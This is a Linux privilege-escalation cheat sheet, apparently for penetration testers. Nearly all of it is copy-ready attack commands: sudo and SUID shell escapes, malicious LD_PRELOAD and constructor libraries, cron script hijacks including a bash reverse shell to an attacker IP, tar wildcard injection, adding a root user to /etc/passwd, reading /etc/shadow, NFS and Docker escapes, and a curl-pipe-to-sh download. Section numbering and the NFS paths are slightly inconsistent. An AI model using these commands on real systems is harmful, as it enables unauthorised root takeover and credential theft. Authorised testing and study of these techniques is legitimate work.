Linux Privilege Escalation - Cheat Sheet

Escalate from a low-privilege shell to root. Each section covers how to find
and exploit the vector. Run linpeas first — it flags most of these automatically.
Replace <placeholders> with your own values.


════════════════════════════════════════════════════════════════════
① AUTOMATED TOOLS — RUN FIRST
════════════════════════════════════════════════════════════════════

Always run these first. LinPEAS catches 90% of privesc paths automatically.

    # Transfer and run linpeas:
    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
    # Or transfer the file:
    chmod +x linpeas.sh && ./linpeas.sh | tee linpeas_out.txt

    # LSE — cleaner output, good for quick triage:
    chmod +x lse.sh && ./lse.sh -l 1

    # pspy — watch live processes without root (essential for cron):
    chmod +x pspy64 && ./pspy64

LinPEAS output colors: yellow = interesting, red/magenta = high-probability exploit.


════════════════════════════════════════════════════════════════════
② SUDO -L
════════════════════════════════════════════════════════════════════

The single most important command after landing a shell.

    sudo -l

Cross-reference every binary at gtfobins.github.io (filter by Sudo).

Common GTFOBins escapes:

    # vim:
    sudo vim -c ':!/bin/bash'

    # find:
    sudo find . -exec /bin/bash \; -quit

    # python / python3:
    sudo python3 -c 'import os; os.system("/bin/bash")'

    # nmap (older versions with --interactive):
    sudo nmap --interactive
    !sh

    # tar:
    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

    # less / more:
    sudo less /etc/passwd    # then type: !bash

    # awk:
    sudo awk 'BEGIN {system("/bin/bash")}'

    # perl:
    sudo perl -e 'exec "/bin/bash"'

If output shows (ALL) ALL → you already have full root. Just run: sudo /bin/bash


── LD_PRELOAD Injection ─────────────────────────────────────────────

If sudo -l shows env_keep+=LD_PRELOAD:

    # 1. Write the malicious library:
    cat > /tmp/evil.c << 'EOF'
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
    }
    EOF

    # 2. Compile:
    gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

    # 3. Run any allowed binary:
    sudo LD_PRELOAD=/tmp/evil.so <any-allowed-binary>

PYTHONPATH variant: create /tmp/os.py with `import pty; pty.spawn("/bin/bash")`,
then run: sudo PYTHONPATH=/tmp <any-python-script>


════════════════════════════════════════════════════════════════════
③ SUID / SGID BINARY ABUSE
════════════════════════════════════════════════════════════════════

SUID files execute as their owner (usually root) regardless of who runs them.

    find / -perm -4000 -type f 2>/dev/null     # SUID
    find / -perm -2000 -type f 2>/dev/null     # SGID
    find / -perm -6000 -type f 2>/dev/null     # both

Check every result at gtfobins.github.io — filter by SUID.
Common dangerous binaries: bash, python, vim, find, cp, nmap, perl, ruby, tar.

Common exploits:

    # bash with SUID bit:
    /bin/bash -p               # -p keeps effective UID = root

    # find (SUID):
    find . -exec /bin/bash -p \; -quit

    # python / python3 (SUID):
    python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

    # vim (SUID):
    vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

    # cp (SUID) — read privileged files:
    cp /etc/shadow /tmp/shadow.bak

    # nmap (old SUID versions):
    nmap --interactive
    !sh


════════════════════════════════════════════════════════════════════
④ CAPABILITIES ABUSE
════════════════════════════════════════════════════════════════════

Linux capabilities grant partial root powers. cap_setuid+ep is effectively root.

    getcap -r / 2>/dev/null

Dangerous capabilities:
  cap_setuid+ep         — can change UID to 0 (root)
  cap_dac_read_search   — bypass read permission checks
  cap_dac_override      — bypass all file permission checks

Exploits:

    # cap_setuid — Python:
    python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

    # cap_setuid — Perl:
    perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'

    # cap_setuid — Ruby:
    ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

    # cap_dac_read_search — read any file:
    python3 -c 'print(open("/etc/shadow").read())'


════════════════════════════════════════════════════════════════════
⑤ CRON JOB HIJACKING
════════════════════════════════════════════════════════════════════

Root cron jobs that call writable scripts are instant escalation.

    crontab -l                    # current user's cron jobs
    cat /etc/crontab              # system-wide cron table
    ls -la /etc/cron.*            # cron.d, cron.daily, cron.hourly etc.
    cat /etc/cron.d/*
    pspy64                        # watch live processes — no root needed


── Script hijack — if the script called by cron is writable: ───────

    ls -la /opt/backup.sh         # confirm writable

    # Option A — set SUID on bash:
    echo 'chmod +s /bin/bash' >> /opt/backup.sh
    # Wait for cron to fire, then:
    bash -p

    # Option B — reverse shell:
    echo 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' >> /opt/backup.sh


── PATH hijack — if cron's PATH includes a writable dir before /usr/bin: ──

    # Example: /etc/crontab PATH=/home/user/bin:/usr/bin
    mkdir -p /home/<user>/bin
    printf '#!/bin/bash\nchmod +s /bin/bash\n' > /home/<user>/bin/<script-name>
    chmod +x /home/<user>/bin/<script-name>
    # Wait for cron to fire, then: bash -p


── Wildcard injection — if cron runs tar with * in a writable dir: ─

    # In the directory being archived:
    touch -- '--checkpoint=1'
    touch -- '--checkpoint-action=exec=bash /tmp/rev.sh'
    # Create /tmp/rev.sh with your payload
    # On next cron run, tar processes filenames as args → executes rev.sh as root


════════════════════════════════════════════════════════════════════
⑥ WRITABLE /etc/passwd
════════════════════════════════════════════════════════════════════

    ls -la /etc/passwd            # check if writable

    # Generate password hash:
    openssl passwd -1 <password>

    # Append new root user (UID:GID = 0:0):
    echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd

    # Switch to the new user:
    su root2


════════════════════════════════════════════════════════════════════
⑥ NFS no_root_squash
════════════════════════════════════════════════════════════════════

If an NFS export has no_root_squash, files created as root on your attacker
machine are owned by root on the target.

    # On target:
    cat /etc/exports              # look for no_root_squash

    # From attacker:
    showmount -e <target-ip>

    # On attacker machine (as root):
    mount -t nfs <target-ip>:/<share> /mnt/nfs -o nolock
    cp /bin/bash /mnt/nfs/bash
    chmod +s /mnt/nfs/bash

    # On target machine:
    /tmp/bash -p                  # -p keeps elevated EUID → root shell


════════════════════════════════════════════════════════════════════
⑦ OTHER VECTORS
════════════════════════════════════════════════════════════════════


── Docker Group Escape ───────────────────────────────────────────────

    id | grep docker

    docker run -v /:/mnt --rm -it alpine chroot /mnt sh


── Writable systemd Service ─────────────────────────────────────────

    find /etc/systemd /lib/systemd /usr/lib/systemd -writable -type f 2>/dev/null

    # Edit ExecStart in the service file:
    ExecStart=/bin/bash -c 'chmod +s /bin/bash'

    systemctl daemon-reload
    systemctl restart <service-name>
    bash -p


── Shared Library (.so) Hijacking ───────────────────────────────────

    ldd /usr/bin/<suid-binary>                     # find lib paths
    find / -writable -name "*.so*" 2>/dev/null

    # Malicious constructor:
    cat > /tmp/evil.c << 'EOF'
    #include <stdlib.h>
    void __attribute__((constructor)) init() {
        system("/bin/bash -p");
    }
    EOF
    gcc -shared -fPIC -o /path/to/lib.so /tmp/evil.c
    # Run the SUID binary → library fires → root shell


── Kernel Exploits ──────────────────────────────────────────────────

    uname -a                      # kernel version + architecture
    cat /etc/os-release
    searchsploit "linux kernel" <version>

    # DirtyPipe — CVE-2022-0847, Linux 5.8–5.16.11
    # PoC: github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

    # DirtyCow — CVE-2016-5195, Linux < 4.14
    # PoC: github.com/dirtycow/dirtycow.github.io

    # PwnKit — CVE-2021-4034, pkexec SUID (virtually all distros pre-2022)
    # PoC: github.com/ly4k/PwnKit

    # Baron Samedit — CVE-2021-3156, sudo 1.8.2–1.8.31p2 / 1.9.0–1.9.5p1:
    sudoedit -s '\' $(python3 -c 'print("A"*1000)')
    # Segfault = likely vulnerable


════════════════════════════════════════════════════════════════════
RECOMMENDED ORDER
════════════════════════════════════════════════════════════════════

1. Run linpeas / pspy64 immediately
2. sudo -l → check GTFOBins for every binary
3. find / -perm -4000 (SUID) + getcap -r /
4. crontab -l + /etc/crontab + pspy64 (watch for 2–3 min)
5. ls -la /etc/passwd + showmount -e (if NFS open)
6. id | grep docker — check group memberships
7. uname -a + searchsploit as last resort

Key ideas:
- sudo -l is the single most important command — GTFOBins for everything
- Cron jobs require patience — pspy64 shows what crontab hides
- /etc/passwd writable = instant root in one command
- Kernel exploits are last resort — noisy, can crash the system
- Check gtfobins.github.io for every binary found via sudo, SUID, or capabilities
